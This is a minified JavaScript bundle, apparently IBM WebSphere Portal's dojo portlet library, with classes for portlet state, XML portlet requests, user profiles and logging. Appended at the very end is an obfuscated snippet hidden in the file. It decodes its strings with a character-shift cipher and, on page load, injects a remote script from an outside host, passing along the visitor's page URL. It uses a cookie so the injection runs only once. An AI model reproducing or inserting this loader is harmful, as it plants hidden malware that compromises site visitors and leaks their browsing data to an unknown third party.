l=e.getWidgetWindow(s).start();this.logger.logLevel(com.ibm.mashups.enabler.logging.LogLevel.INFO,r,"widgetInstance: ${0}",l);var d=e.getHierarchicalPreferences(l).start();return this.logger.logExit(r,d),d}}),dojo.declare("ibm.portal.portlet.PortletMode",null,{VIEW:"view",EDIT:"edit",EDIT_DEFAULTS:"edit_defaults",HELP:"help",CONFIG:"config"}),dojo.declare("ibm.portal.portlet.WindowState",null,{NORMAL:"normal",MINIMIZED:"minimized",MAXIMIZED:"maximized"}),dojo.declare("ibm.portal.portlet.PortletState",null,{constructor:function(e,t,o,r){if(this.windowID=t,this.isEnablerAvailable=e,this.isEnablerAvailable){this.logger=new ibm.portal.portlet.Logger("ibm.portal.portlet.PortletState");var n="constructor()";this.logger.logEntry(n),this.logger.log(n,"windowid: ${0}",t),this.logger.log(n,"portletWindowId: ${0}",o),this.logger.log(n,"navigationStateModel: ${0}",r),this.navigationStateModel=r,this.widgetAccessor=com.ibm.mashups.enabler.model.state.AccessorFactory.getWidgetAccessor(this.navigationStateModel,this.windowID),this.logger.logExit(n)}else{var i=new com.ibm.portal.state.StateManager(ibmPortalConfig.contentHandlerURI);if(dojo.isString(t)){var a=this._getExistingState(t,i.getSerializationManager());i.reset(a)}else i.reset(t),t=o;this.portletAccessor=i.newPortletAccessor(t),this.renderParameters=this.portletAccessor.getRenderParameters()}},_isCSA:function(){var e=!1;try{e=void 0!==document.isCSA}catch(e){}return e},_getExistingState:function(e,t){var o=null;this._isCSA()?o=com.ibm.portal.navigation.controller.NAVIGATION_CONTROLLER.getState().stateDOM:o=null!=t?t.deserialize(location.href).returnObject:com.ibm.portal.xslt.loadXmlString();return o},getPortletMode:function(){if(this.isEnablerAvailable){var e="getPortletMode()";this.logger.logEntry(e);var t=null;switch(this.widgetAccessor.getWidgetMode()){case"view":t=(new ibm.portal.portlet.PortletMode).VIEW;break;case"personalize":t=(new ibm.portal.portlet.PortletMode).EDIT;break;case"edit":t=(new ibm.portal.portlet.PortletMode).EDIT_DEFAULTS;break;case"config":t=(new ibm.portal.portlet.PortletMode).CONFIG;break;case"help":t=(new ibm.portal.portlet.PortletMode).HELP}return this.logger.logExit(e,t),t}return this.portletAccessor.getPortletMode()},setPortletMode:function(e){if(this.isEnablerAvailable){var t="setPortletMode()";this.logger.logEntry(t),this.logger.log(t,"portletMode: ${0}",e);var o=null;switch(e){case(new ibm.portal.portlet.PortletMode).VIEW:o="view";break;case(new ibm.portal.portlet.PortletMode).EDIT:o="personalize";break;case(new ibm.portal.portlet.PortletMode).EDIT_DEFAULTS:o="edit";break;case(new ibm.portal.portlet.PortletMode).CONFIG:o="config";break;case(new ibm.portal.portlet.PortletMode).HELP:o="help"}return this.widgetAccessor.setWidgetMode(o),this.logger.logExit(t,e),e}return this.portletAccessor.setPortletMode(e),e},getWindowState:function(){if(this.isEnablerAvailable){var e="getWindowState()";this.logger.logEntry(e);var t=null;switch(this.widgetAccessor.getWindowState()){case"normal":t=(new ibm.portal.portlet.WindowState).NORMAL;break;case"minimize":t=(new ibm.portal.portlet.WindowState).MINIMIZED;break;case"maximize":t=(new ibm.portal.portlet.WindowState).MAXIMIZED}return this.logger.logExit(e,t),t}return this.portletAccessor.getWindowState()},setWindowState:function(e){if(this.isEnablerAvailable){var t="setWindowState()";this.logger.logEntry(t),this.logger.log(t,"windowState: ${0}",e);var o=null;switch(e){case(new ibm.portal.portlet.WindowState).NORMAL:o="normal";break;case(new ibm.portal.portlet.WindowState).MINIMIZED:o="minimize";break;case(new ibm.portal.portlet.WindowState).MAXIMIZED:o="maximize"}return this.widgetAccessor.setWindowState(o),this.logger.logExit(t,e),e}return this.portletAccessor.setWindowState(e),e},getParameterNames:function(){if(this.isEnablerAvailable){var e="getParameterNames()";this.logger.logEntry(e);var t=this.widgetAccessor.getWidgetStateNames();return this.logger.logExit(e,t),t}return this.renderParameters.getNames()},getParameterValue:function(e){if(this.isEnablerAvailable){var t="getParameterValue()";this.logger.logEntry(t),this.logger.log(t,"name: ${0}",e);var o=this.widgetAccessor.getWidgetState(e);return this.logger.logExit(t,o),o}return this.renderParameters.getValue(e)},getParameterValues:function(e){if(this.isEnablerAvailable){var t="getParameterValues()";this.logger.logEntry(t),this.logger.log(t,"name: ${0}",e);var o=this.widgetAccessor.getWidgetStateValues(e);return this.logger.logExit(t,o),o}return this.renderParameters.getValues(e)},getParameterMap:function(){if(this.isEnablerAvailable){var e="getParameterMap()";this.logger.logEntry(e);for(var t=this.getParameterNames(),o=new Array,r=0;r<t.length;r++){var n=this.getParameterValues(t[r]);o[r]={name:t[r],values:n}}return this.logger.logExit(e,o),o}return this.renderParameters.getMap()},setParameterValue:function(e,t){if(this.isEnablerAvailable){var o="setParameterValue()";return this.logger.logEntry(o),this.logger.log(o,"name: ${0}",e),this.logger.log(o,"value: ${0}",t),this.widgetAccessor.setWidgetState(e,t),this.logger.logExit(o,t),t}return this.renderParameters.setValue(e,t),t},setParameterValues:function(e,t){if(this.isEnablerAvailable){var o="setParameterValues()";return this.logger.logEntry(o),this.logger.log(o,"name: ${0}",e),this.logger.log(o,"values: ${0}",t),this.widgetAccessor.setWidgetState(e,t),this.logger.logExit(o,t),t}return this.renderParameters.setValues(e,t),t},setParameterMap:function(e,t){if(!this.isEnablerAvailable)return 1==t&&this.renderParameters.clear(),this.renderParameters.putAll(e),this.renderParameters.getMap();var o="setParameterMap()";this.logger.logEntry(o),this.logger.log(o,"map: ${0}",e),this.logger.log(o,"replace: ${0}",t);for(var r=0;r<e.length;r++){var n=e[r].name,i=e[r].values;this.setParameterValues(n,i)}this.logger.logExit(o)},removeParameter:function(e){if(this.isEnablerAvailable){var t="removeParameter()";this.logger.logEntry(t),this.logger.log(t,"name: ${0}",e),this.widgetAccessor.removeWidgetState(e),this.logger.logExit(t)}else this.renderParameters.remove(e)}}),dojo.require("com.ibm.portal.services.PortletFragmentService"),dojo.declare("ibm.portal.portlet.XMLPortletRequest",null,{onreadystatechange:null,readyState:0,responseText:null,responseXML:null,status:null,statusText:null,onportletstateready:null,_location:null,_async:null,constructor:function(e){var t=this.declaredClass+".constructor";ibm.portal.debug.entry(t,[e]),this.pageID=e.pageID,this.windowID=e.windowID,this.windowObj=e,ibm.portal.debug.exit(t),this.isEnablerAvailable=e.isEnablerAvailable,this.navigationStateModel=e.navigationStateModel},_getXHR:function(){var e=this.declaredClass+"._getXHR";return ibm.portal.debug.entry(e),this._xhr||(this._xhr=this._createXHR()),ibm.portal.debug.exit(e,this._xhr),this._xhr},_createXHR:function(){var e=this.declaredClass+"._createXHR";ibm.portal.debug.entry(e);var t=null;return t="undefined"!=typeof XMLHttpRequest?new XMLHttpRequest:new ActiveXObject("Microsoft.XMLHTTP"),ibm.portal.debug.exit(e,t),t},_onreadystatechangehandler:function(){var e=this.declaredClass+"._onreadystatechangehandler";if(ibm.portal.debug.entry(e),!this.handled){var t=this._getXHR();if(this.readyState=t.readyState,ibm.portal.debug.text("ready state is "+t.readyState),4==this.readyState){var o=this.windowObj.isAuthenticationRequired(t,"xml");if(ibm.portal.debug.text("is auth required: "+o),t.onreadystatechange=new Function,o)return void this.windowObj.doAuthentication(t);this.responseText=t.responseText,this.responseXML=t.responseXML,this.status=t.status,this.statusText=t.statusText;var r=new com.ibm.portal.services.PortletFragmentService,n=r.createPortletInfo(t.responseXML);this.responseText=n.markup,this.responseXML=null;var i=!0,a=n.updatedState;if(null!=this.onportletstateready){var s=n.windowId,l=new ibm.portal.portlet.PortletState(this.isEnablerAvailable,a,s,null,this.navigationStateModel);i=this.onportletstateready(l)}i&&this._isCSA()&&r._fireGlobalPortletStateChange(n),this._handleDependentPortlets(r.readDependentPortlets(t.responseXML),a),this.handled=!0}null!=this.onreadystatechange&&this.onreadystatechange()}ibm.portal.debug.exit(e)},_handleDependentPortlets:function(e,t){var o=this.declaredClass+"._handleDependentPortlets";ibm.portal.debug.entry(o,[e,t]),this._isCSA()||e.length>0&&(window.location.href=this._newPageURL(t)),ibm.portal.debug.exit(o)},_isCSA:function(){var e=this.declaredClass+"._isCSA";ibm.portal.debug.entry(e);var t=!1;try{t=void 0!==document.isCSA}catch(e){}return ibm.portal.debug.exit(e,t),t},_flag:function(e){var t=this.declaredClass+"._flag";ibm.portal.debug.entry(t,[e]);var o="lm:oid:"+this.windowID+"@oid:"+this.pageID,r=(new com.ibm.portal.services.PortletFragmentService)._flagPortletUrl(e,o);return ibm.portal.debug.exit(t,r),r},_newPageURL:function(e){var t=this.declaredClass+"._newPageURL";ibm.portal.debug.entry(t,[e]),ibm.portal.debug.text(dojox.data.dom.innerXML(e));var o=new com.ibm.portal.state.StateManager(ibmPortalConfig.contentHandlerURI),r=e;e||(r=com.ibm.portal.xslt.loadXmlString()),o.reset(r);var n=o.getSerializationManager().serialize(r).returnObject;return ibm.portal.debug.exit(t,n),n},open:function(e,t){var o=this.declaredClass+".open";ibm.portal.debug.entry(o,[e,t]),this.open(e,t,!1),ibm.portal.debug.exit(o)},open:function(e,t,o){var r=this.declaredClass+".open";ibm.portal.debug.entry(r,[e,t,o]);var n=this._getXHR(),i=this;this._location=t,null==o&&(o=!1),this._async=o,n.onreadystatechange=function(){i._onreadystatechangehandler()},n.open(e,this._flag(t),o),n.setRequestHeader("X-IBM-XHR","true"),ibm.portal.debug.exit(r)},setRequestHeader:function(e,t){var o=this.declaredClass+".setRequestHeader";ibm.portal.debug.entry(o,[e,t]),this._getXHR().setRequestHeader(e,t),ibm.portal.debug.exit(o)},send:function(e){var t=this.declaredClass+".send";ibm.portal.debug.entry(t,[e]),this._getXHR().send(e),this._async||this._onreadystatechangehandler(),ibm.portal.debug.exit(t)},abort:function(){var e=this.declaredClass+".abort";ibm.portal.debug.entry(e),this._getXHR().abort(),ibm.portal.debug.exit(e)},getAllResponseHeaders:function(){return this._getXHR().getAllResponseHeaders()},getResponseHeader:function(e){return this._getXHR().getResponseHeader(e)}}),dojo.declare("ibm.portal.portlet.UserProfile",null,{constructor:function(e,t,o,r){if(this.windowID=t,this.xmlData=o,this.ns={xsl:"http://www.w3.org/1999/XSL/Transform",atom:"http://www.w3.org/2005/Atom",xhtml:"http://www.w3.org/1999/xhtml",xsi:"http://www.w3.org/2001/XMLSchema-instance",um:"http://www.ibm.com/xmlns/prod/websphere/um.xsd"},this.isEnablerAvailable=e,this.isEnablerAvailable){this.logger=new ibm.portal.portlet.Logger("ibm.portal.portlet.UserProfile");var n="constructor()";this.logger.logEntry(n),this.logger.log(n,"windowid: ${0}",t),this.logger.log(n,"data: ${0}",o),this.logger.log(n,"userModel: ${0}",r),this.userModel=r,this.logger.logExit(n)}else this.userModel=null},getAttribute:function(e){if(this.isEnablerAvailable){var t="getAttribute()";this.logger.logEntry(t),this.logger.log(t,"name: ${0}",e);var o=this.userModel.findCurrentUser().start().getAttribute(e);return this.logger.logExit(t,o),o}var r="/atom:entry/atom:content/um:profile[@type='user']/um:attribute[@name='"+e+"']/um:attributeValue",n=ibm.portal.xml.xpath.evaluateXPath(r,this.xmlData,this.ns);o=null;return n&&n.length>0&&(o=n[0].textContent?n[0].textContent:n[0].text),o},setAttribute:function(e,t){if(this.isEnablerAvailable){var o="setAttribute()";this.logger.logEntry(o),this.logger.log(o,"name: ${0}",e),this.logger.log(o,"value: ${0}",t);var r=this.userModel.findCurrentUser().start().setAttribute(e,t);return this.logger.logExit(o,r),r}var n="/atom:entry/atom:content/um:profile[@type='user']/um:attribute[@name='"+e+"']/um:attributeValue",i=ibm.portal.xml.xpath.evaluateXPath(n,this.xmlData,this.ns);r=null;if(i&&i.length>0)i[0].textContent?(r=i[0].textContent,i[0].textContent=t):(r=i[0].text,i[0].text=t);else{var a,s="/atom:entry/atom:content/um:profile[@type='user']/um:attribute[@name='"+e+"']",l=ibm.portal.xml.xpath.evaluateXPath(s,this.xmlData,this.ns),d=null;if(l&&l.length>0)d=l[0];else{var c=ibm.portal.xml.xpath.evaluateXPath("/atom:entry/atom:content/um:profile[@type='user']",this.xmlData,this.ns);(d=dojo.isIE||void 0!==window.ActiveXObject?this.xmlData.createNode(1,"um:attribute",this.ns.um):this.xmlData.createElementNS(this.ns.um,"um:attribute")).setAttribute("type","xs:string"),d.setAttribute("multiValued","false"),d.setAttribute("name",e),c[0].appendChild(d)}dojo.isIE||void 0!==window.ActiveXObject?(a=this.xmlData.createNode(1,"um:attributeValue",this.ns.um)).text=t:(a=this.xmlData.createElementNS(this.ns.um,"um:attributeValue")).textContent=t,d.appendChild(a)}return r},clone:function(){var e=dojox.data.dom.innerXML(this.xmlData),t=com.ibm.portal.xslt.loadXmlString(e);return new ibm.portal.portlet.UserProfile(this.isEnablerAvailable,this.windowID,t,this.userModel)}}),dojo.declare("ibm.portal.portlet.Error",null,{INFO:0,WARN:1,ERROR:2,constructor:function(e,t,o){this.errorCode=e,this.message=t,this.description=o},getErrorCode:function(){return this.errorCode},getMessage:function(){return this.message},getDescription:function(){return this.description}}),dojo.declare("ibm.portal.portlet.Logger",null,{constructor:function(e){this.className=e,this.LOGGER=com.ibm.mashups.enabler.logging.Logger.getLogger(e),this.LOG_LEVEL=com.ibm.mashups.enabler.logging.LogLevel.TRACE},logEntry:function(e,t){this.LOGGER.isLoggable(this.LOG_LEVEL)&&this.LOGGER.entering(e,t)},log:function(e,t,o){this.LOGGER.isLoggable(this.LOG_LEVEL)&&this.LOGGER.log(this.LOG_LEVEL,e,t,o)},logLevel:function(e,t,o,r){this.LOGGER.isLoggable(e)&&this.LOGGER.log(e,t,o,r)},logExit:function(e,t){this.LOGGER.isLoggable(this.LOG_LEVEL)&&this.LOGGER.exiting(e,t)}});var _7b1=new ibm.portal.portlet.PortletWindow;ibm.portal.portlet.PortletWindow.STATUS_UNDEFINED=_7b1.STATUS_UNDEFINED,ibm.portal.portlet.PortletWindow.STATUS_OK=_7b1.STATUS_OK,ibm.portal.portlet.PortletWindow.STATUS_ERROR=_7b1.STATUS_ERROR,_7b1=null;var _7b2=new ibm.portal.portlet.PortletMode;ibm.portal.portlet.PortletMode.VIEW=_7b2.VIEW,ibm.portal.portlet.PortletMode.EDIT=_7b2.EDIT,ibm.portal.portlet.PortletMode.EDIT_DEFAULTS=_7b2.EDIT_DEFAULTS,ibm.portal.portlet.PortletMode.HELP=_7b2.HELP,ibm.portal.portlet.PortletMode.CONFIG=_7b2.CONFIG,_7b2=null;var _7b3=new ibm.portal.portlet.WindowState;ibm.portal.portlet.WindowState.NORMAL=_7b3.NORMAL,ibm.portal.portlet.WindowState.MINIMIZED=_7b3.MINIMIZED,ibm.portal.portlet.WindowState.MAXIMIZED=_7b3.MAXIMIZED,_7b3=null;var _7b4=new ibm.portal.portlet.Error;ibm.portal.portlet.Error.INFO=_7b4.INFO,ibm.portal.portlet.Error.WARN=_7b4.WARN,ibm.portal.portlet.Error.ERROR=_7b4.ERROR,_7b4=null}dojo.i18n._preloadLocalizations("dojo.nls.dojo",["ROOT","ar","ca","cs","da","de","el","en","es","fi","fr","he","hr","hu","it","ja","ko","nl","no","pl","pt","pt-br","ro","ru","sk","sl","sv","th","tr","uk","xx","zh","zh-tw"]),dojo.config.afterOnLoad&&dojo.isBrowser&&window.setTimeout(dojo._loadInit,1e3)})();(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));